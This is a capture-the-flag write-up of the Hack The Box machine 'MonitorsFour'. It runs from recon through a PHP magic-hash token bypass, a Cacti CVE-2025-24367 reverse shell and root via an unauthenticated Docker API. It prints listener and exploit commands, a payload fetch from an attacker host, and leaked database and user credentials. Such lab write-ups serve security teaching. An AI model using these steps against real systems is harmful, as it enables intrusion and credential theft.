# HTB: MonitorsFour

**Target IP:** 10.10.11.98
**Difficulty:** *(add rating)*
**OS:** Linux (Docker-based)

---

## 1. Reconnaissance

### Nmap
Ran three Nmap scans against the target (`-sS`, `-sC -A -sV -O`, `-oN`).

**Open ports:**
- `80/tcp` – nginx
- `5985/tcp` – HTTPAPI/2.0 (supported methods: `GET`, `HEAD`, `POST`)

### Rustscan
```bash
rustscan -a $targetIp --ulimit 2000 -r 1-65535 -- -A sS -Pn
```
Confirmed the same two open ports found via Nmap.

### Adding the host
The IP alone returned nothing over HTTP, so I added a hostname entry:

```bash
echo '10.10.11.98 monitorsfour.htb' | sudo tee -a /etc/hosts
```

After this, `http://monitorsfour.htb` loaded correctly.

---

## 2. Web Enumeration

### Initial poking
- Tried `admin123:admin123` on the login page → `Invalid Credentials`
- Checked dev tools (F12) — nothing immediately useful
- Wappalyzer identified the stack: **nginx**, **PHP**, **jQuery**
- Metasploit had nothing usable against the web app

### Directory brute force
```bash
python3 dirsearch.py -u http://monitorsfour.htb -x 404
```

**Notable results:**
| Path | Status |
|---|---|
| `/.env` | 200 OK |
| `/admin/.htaccess` | — |
| `/administrator/.htaccess` | — |
| `/contact` | 200 OK |
| `/login` | 200 OK |
| `/user` | 200 OK |

### Leaked `.env` file
`http://monitorsfour.htb/.env` was directly downloadable and contained database credentials:

```
DB_HOST=mariadb
DB_PORT=3306
DB_NAME=monitorsfour_db
DB_USER=monitorsdbuser
DB_PASS=f37p2j8f4t0r
```

### Subdomain discovery
```bash
ffuf -c -u http://monitorsfour.htb/ \
  -H "Host: FUZZ.monitorsfour.htb" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fw 3
```

Found `cacti.monitorsfour.htb` → added to `/etc/hosts`.

Cacti version fingerprinted as **1.2.28**, vulnerable to **CVE-2025-24367**. Downloaded the public PoC repo for later use.

---

## 3. Authentication Bypass — PHP Type Juggling

Investigated the `/user` endpoint further:

```bash
curl http://monitorsfour.htb/user
```

Returned a "missing token" error. Supplying a junk token (`AAAA`) returned "Invalid or missing," confirming the endpoint validates a token parameter.

The backend runs **PHP 8.3.27**. This opened the door to a **Magic Hash** attack, exploiting PHP's loose (`==`) comparison of strings that look like scientific notation:

- Any string of the form `0e<digits>` is interpreted as float `0` during loose comparison.
- `"0e1234" == "0e9999"` → `TRUE` (both evaluate to `0`)
- `"0e1234" == 0` → `TRUE`

Testing this against the token check:

```bash
curl "http://monitorsfour.htb/user?token=0e1234"
```

This returned valid user data, confirming the token comparison was vulnerable to type juggling.

### Data exfiltration
```bash
curl "http://monitorsfour.htb/user?token=0e1234" | jq '.' > users.json
```

The resulting `users.json` contained usernames, hashed passwords, tokens, and roles — useful for privilege escalation later.

### Cracking credentials
The MD5 hash for admin user **Marcus Higgins** was cracked via CrackStation:

```
marcus : wonderful1
```

Used these credentials to log into `http://cacti.monitorsfour.htb`.

---

## 4. Exploitation — Cacti CVE-2025-24367 (RCE)

Cacti uses `rrdtool` to render network graphs based on admin-configured **Graph Templates**. CVE-2025-24367 stems from improper sanitization of template fields that get passed as command-line arguments to `rrdtool`. By injecting a malicious command into a graph template, arbitrary code execution is achieved when the graph is rendered.

### Setup
Started a listener:
```bash
nc -lvnp 4444
```

Ran the PoC:
```bash
python3 exploit.py -u marcus -p wonderful1 -url http://cacti.monitorsfour.htb -i 10.10.17.88 -l 4444
```

**Result:** reverse shell as `www-data@821fbd6a43fa` (inside a Docker container).

---

## 5. Privilege Escalation — Docker API Abuse

Attempted to bring `fscan` into the container for further enumeration but couldn't get a working binary onto the host, so pivoted to manual enumeration instead. This surfaced port **2375** — the **unauthenticated Docker Daemon API** — the intended path to full compromise.

### Staging the container creation payload
On the attacker machine, served a crafted `create_container.json` (mounting the host filesystem into a new container):

```bash
python3 -m http.server 8000
```

On the target/container shell, pulled it down:
```bash
curl http://10.10.17.88:8000/create_container.json -o create_container.json
```

### Creating the malicious container
```bash
curl -H "Content-Type: application/json" \
  -d @create_container.json \
  http://192.168.65.7:2375/containers/create -o resp.json
```

This returned a Docker container ID in `resp.json`.

> **Note:** My first attempt at `create_container.json` was mis-configured and cost significant time troubleshooting. Reverting to the original PoC payload (rather than my modified version) and re-running the transfer/creation steps resolved it.

### Extracting the container ID
```bash
cid=$(grep -o '"Id":"[^"]*"' resp.json | cut -d'"' -f4)
echo $cid
```

### Starting the container
Set up a listener first:
```bash
nc -lvnp 60002
```

Then started the newly created container:
```bash
curl -X POST http://192.168.65.7:2375/containers/$cid/start
```

**Result:** Root shell on the host via the container's mounted host filesystem.

---

## 6. Flag

```bash
cat /host_root/User/Administrator/Desktop/root.txt
```

**Root flag captured.** ✅

---

## Summary of Attack Chain

1. Recon reveals nginx (port 80) + WinRM-style HTTP API (port 5985)
2. `/etc/hosts` entry needed to resolve virtual host
3. Directory brute force finds exposed `/.env` and `/user` endpoints
4. `.env` leaks DB credentials (not directly used, but confirms tech stack)
5. FFUF vhost fuzzing discovers `cacti.monitorsfour.htb`
6. PHP **Magic Hash** (`0e...`) type-juggling bypass on `/user` token check leaks all user records
7. Cracked admin hash → Cacti login
8. **CVE-2025-24367** (Cacti `rrdtool` graph template command injection) → RCE as `www-data` inside a Docker container
9. Unauthenticated **Docker API** (port 2375) abused to create a privileged container mounting the host filesystem
10. Root filesystem access → `root.txt` captured

## Key Takeaways / Lessons Learned
- Exposed `.env` files and unauthenticated debug/API endpoints are high-value low-effort wins during recon.
- PHP loose comparison (`==`) vulnerabilities remain exploitable in modern PHP versions when developer code — not the language itself — performs unsafe comparisons; strict comparison (`===`) or `hash_equals()` prevents this class of bug.
- Keeping third-party monitoring software (Cacti) patched is critical — this CVE allowed authenticated RCE via a core graphing feature.
- Exposing the Docker daemon API (port 2375) without authentication is effectively equivalent to granting root on the host.
